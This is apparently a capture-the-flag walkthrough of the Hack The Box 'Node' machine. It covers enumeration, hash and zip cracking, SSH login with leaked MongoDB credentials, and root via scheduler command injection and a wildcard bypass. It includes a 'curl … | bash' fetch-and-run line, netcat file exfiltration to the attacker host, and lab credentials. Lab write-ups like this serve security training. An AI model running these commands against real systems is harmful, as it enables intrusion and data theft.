Using autorecon to enumerate:
```
# Nmap 7.94SVN scan initiated Sun Feb 25 13:26:45 2024 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Downloads/node/results/10.10.10.58/scans/_full_tcp_nmap.txt -oX /home/kali/Downloads/node/results/10.10.10.58/scans/xml/_full_tcp_nmap.xml 10.10.10.58
Nmap scan report for 10.10.10.58
Host is up, received user-set (0.042s latency).
Scanned at 2024-02-25 13:26:58 IST for 138s
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE            REASON         VERSION
22/tcp   open  ssh                syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
3000/tcp open  hadoop-tasktracker syn-ack ttl 63 Apache Hadoop
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
|_http-title: MyPlace
| hadoop-datanode-info: 
|_  Logs: /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X (90%), Crestron 2-Series (86%), Google Android 4.X (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:google:android:4.0 cpe:/h:hp:p2000_g3
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%), Linux 3.8 - 3.11 (90%), Linux 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=2/25%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=65DAF354%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=109%TI=Z%II=I%TS=8)
SEQ(SP=102%GCD=2%ISR=109%TI=Z%II=I%TS=8)
OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 198.840 days (since Thu Aug 10 17:20:22 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   42.78 ms 10.10.14.1
2   42.76 ms 10.10.10.58

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 25 13:29:16 2024 -- 1 IP address (1 host up) scanned in 151.43 seconds

```
Trying gobuster results in some kind of error:
![](attachment/b233f9619a3fc51524d50ea6230f8781.png)
Now setting up a proxy through burp suite:
![](attachment/e2ed9564ffa669e465ac0b716990e4be.png)
![](attachment/45c891654dc0a5a7b2a263de5ec917a1.png)
Now using gobuster we get this:
![](attachment/7590724c1fd3598d6c871f12439a9c96.png)
This doesn't occur when using our browser so the user agent is being filtered.
The user agent of the browser:
![](attachment/889a880d9404208b457a177293dcc941.png)
Now using -a in gobuster to set user agent:
`gobuster dir -u http://localhost:8081 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
It still doesn't work
So using sitemap from burp suite to check we find app.js:
![](attachment/61e6b092deb7deff3ae2dbf1be92bdce.png)
Checking  http://10.10.10.58:3000/partials/admin.html
Found :
![](attachment/468cf9adb64743b2714b571e4854c2c4.png)
Checking the api folder in site map:
Request:
![](attachment/6df6c7cc90d253208e1c64d657f2a89d.png)
Response:
![](attachment/3a857f14a3f86166dec344284ce18275.png)
We get the password hashes
But checking response for /api/users/ we get:
![](attachment/5318ee1ef0b733d296f951f5a847bcda.png)
# Exploitation
Now trying to crack it:
myP14ceAdm1nAcc0uNT   :           manchester
Now trying to login:
![](attachment/839ae118712c7b790764d3055b89f874.png)
Now we get a myplace.backup file
Judging the text it is base64 encoded so decoding and outputting to a file:
`base64 -d myplace.backup > unknown`
Using file command to check type:
`file unknown`
![](attachment/bb77dd0eead9bab77e89b90cf9b67a81.png)
It is a zip file.
But it has a password:
![](attachment/6506c9730b114b73f36f37f156b54966.png)We found the password using fcrackzip dictionary attack!
`fcrackzip -D -p '/home/kali/Documents/rockyou.txt' backup.zip`
![](attachment/7365bde0ebb867a53fff9dfc84034595.png)
Now we have the sourcecode:
![](attachment/592c3602ea33c78ed321c04d288e3e42.png)
Searching for keyword password in the source code:
`grep -iR password .| less `
Nothing much usefuil.

Now we found the mongodb cred in app.js.
![](attachment/9bb222425943df5c6d1928754b1f26fe.png)
mark: **5AYRft73VtFpc84k**
Could try this in ssh.
And we get in:
![](attachment/4d087ddef078bfcbb9718032d14f9797.png)Now running linenum:
`curl 10.10.14.22/linpeas.sh | bash`

Seeing processes we find a weird one:
![](attachment/e1728819a2764edc01818e67a7b25a2d.png)![](attachment/69bb34f5cf06c7c5af07a68e657a71bd.png)
Using the password:
`mongo -p -u mark scheduler`

![](attachment/a04591c962387867c8251eaa5a45e485.png)
Using mongo to make an object now:
``db.tasks.insert( { "cmd": "cp /bin/dash /tmp/ippsec; chmod 6755 /bin/dash;" })``
This sets it to run as user tom
`db.tasks.insert({"cmd" : "chmod u+s /tmp/ippsec"})`

Now we find that it executed.
So checking running processes:
`ps aux | grep sched`
![](attachment/4c0cca8d2c7535ec4db5bef3c67372ca.png)

It executed and running:
`/tmp/ippsec -p`
Gets us a shell as tom:
![](attachment/597bf877ae7b4af89663e51a97faba7a.png)
Now running linpeas with `curl 10.10.14.22/linpeas.sh | bash`

We find an suid binary!:
![](attachment/a7c0e2ada72648a0a59a7f9f6aebb966.png)
Now we see that we are in marks group:
![](attachment/f23d96eed79df12d458bea9e0fb5a65c.png)
So changing the permissions with mongo:
`db.tasks.insert({"cmd": "chown tom:admin /tmp/ippsec; chmod 6755 /tmp/ippsec;"})`

Now running /tmp/ippsec:
![](attachment/bc4dda0a86039320c8805ca20668d2d8.png)
We are in the admin group
![](attachment/6ca61fa6cf3b0f2c5286671bd1771d2e.png)

Now transfering the `/usr/local/bin/backup` file with netcat
- Attacker:
	`nc -nvlp 8082 > backup`
- Target
	`nc 10.10.14.22 8082 < /usr/local/bin/backup`
In kali:
We had noticed a backup key in app.js:
![](attachment/9e2dbadaea54230ef2266bc0deb2267e.png)
In tom's shell:
`/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/fuck > test`

`cat test | base64 --decode > test-decoded`

`file test-decoded`

`unzip test-decoded`

`ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /../../etc > test`

```
strstr("/tmp", "..")                             = nil
strstr("/tmp", "/root")                          = nil
strchr("/tmp", ';')                              = nil
strchr("/tmp", '&')                              = nil
strchr("/tmp", '`')                              = nil
strchr("/tmp", '$')                              = nil
strchr("/tmp", '|')                              = nil
strstr("/tmp", "//")                             = nil
strcmp("/tmp", "/")                              = 1
strstr("/tmp", "/etc")                           = nil
strcpy(0xff98a1ab, "/tmp")                       = 0xff98a1ab
```

strstr: returns pointer to first occurrence of str2 in str1

strchr: returns pointer to first occurrence of char in str1

strcmp: returns 0 if str1 is same as str2

Wildcards are not checked so:
`/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**/r**t.txt > root`

`cat root | base64 --decode > root-decoded`
`unzip root-decoded`

Then get the root.txt